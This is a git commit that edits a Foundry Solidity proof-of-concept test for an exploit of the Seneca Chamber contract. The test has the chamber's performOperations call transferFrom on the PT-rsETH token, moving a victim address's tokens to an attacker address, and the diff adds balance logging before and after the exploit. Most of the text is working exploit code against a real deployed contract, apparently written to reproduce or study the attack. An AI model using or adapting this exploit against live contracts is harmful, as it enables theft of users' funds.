0d87d9ef9a2fbcc04a9b223673cf0da9a6308604
Ciara Nightingale <ciara.nightingale@sky.com>
2024-03-04 11:07:14 +0000

    log state

--- test/poc.t.sol
+++ test/poc.t.sol
@@ -3,10 +3,10 @@ pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
 import {IChamber} from "./interfaces/IChamber.sol";
-import {IERC20} from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";
+import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
 contract SenecaPoC is Test {
-    IERC20 constant resETH = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
+    IERC20 constant PTrsETH = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
     IChamber constant CHAMBER = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
 
     function setUp() public {
@@ -16,6 +16,8 @@ contract SenecaPoC is Test {
     }
 
     function testPoc() public {
+        console.log("Attacker balance before exploit:", PTrsETH.balanceOf(0x94641c01a4937f2C8eF930580cF396142a2942DC)/1e18, "PT-rsETH");
+        console.log("Users balance before exploit:", PTrsETH.balanceOf(0x9CBF099ff424979439dFBa03F00B5961784c06ce)/1e18, "PT-rsETH");
         // arguments to pass to performOperations
         // perform OPERATION_CALL = 30 for _call to be called
         uint8[] memory actions = new uint8[](1);
@@ -30,7 +32,7 @@ contract SenecaPoC is Test {
         // specify that the chamber contract calls tranferFrom
         bytes memory callData;
         callData = abi.encodeWithSignature("transferFrom(address,address,uint256)", 0x9CBF099ff424979439dFBa03F00B5961784c06ce, 0x94641c01a4937f2C8eF930580cF396142a2942DC, 1385238431763437306795);
-        address callee = address(resETH);
+        address callee = address(PTrsETH);
         bool useValue1 = false;
         bool useValue2 = false;
         uint8 returnValues = 0;
@@ -38,5 +40,8 @@ contract SenecaPoC is Test {
         datas[0] = data;
 
         CHAMBER.performOperations(actions, values, datas);
+
+        console.log("Attacker balance after exploit:", PTrsETH.balanceOf(0x94641c01a4937f2C8eF930580cF396142a2942DC)/1e18, "PT-rsETH");
+        console.log("Users balance after exploit:", PTrsETH.balanceOf(0x9CBF099ff424979439dFBa03F00B5961784c06ce)/1e18, "PT-rsETH");
     }
 }
